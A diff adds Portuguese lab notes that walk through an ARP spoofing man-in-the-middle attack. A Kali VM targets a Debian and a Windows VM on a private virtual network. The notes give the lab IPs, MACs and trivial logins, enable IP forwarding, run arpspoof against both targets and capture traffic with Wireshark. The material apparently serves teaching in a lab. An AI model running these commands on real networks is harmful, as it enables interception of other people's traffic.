@@ -1,0 +1,37 @@
+@@@ARPSPOOFING@@@
+>>>PASSO1
+máq deian (alvo1)
+debian:123	IP:192.168.122.49 	MAC: 52:54:00:04:27:4f
+máq windows (alvo2)
+IEUser:123	IP:192.168.122.209	MAC: 52:54:00:32:1c:41
+
+máq kali(ataque)
+OBS: na máquina kali, checar qual interface está na mesma rede que as máquinas
+alvo:
+#ip a
+verifique qual possui o mesmo range de ip, ela será usada no spoofing
+
+
+
+
+>>>PASSO2 (só dá pra verificar se tiver acesso aos alvos)
+vc pode verificar a tabela ARP das vítimas antes do ataque, para conferir o resultado,
+porém em um ataque vc não terá acesso a essas informações.
+máq deian (alvo1)
+#ip n
+máq windows (alvo2)
+#arp -a
+
+>>>PASSO3
+Habilitar o redirecionamento de pacotes.
+máq kali(ataque)
+#echo 1 > /proc/sys/net/ipv4/ip_forward
+
+>>>PASSO4
+Realizar o ARP Spoofing.
+#arpspoof -i virbr0 -t <IP_ALVO1> -r <IP_ALVO2>
+#arpspoof -i virbr0 -t 192.168.122.49 -r 192.168.122.209
+
+
+>>>PASSO 5
+CAPTURAR COM O WIRESHARK
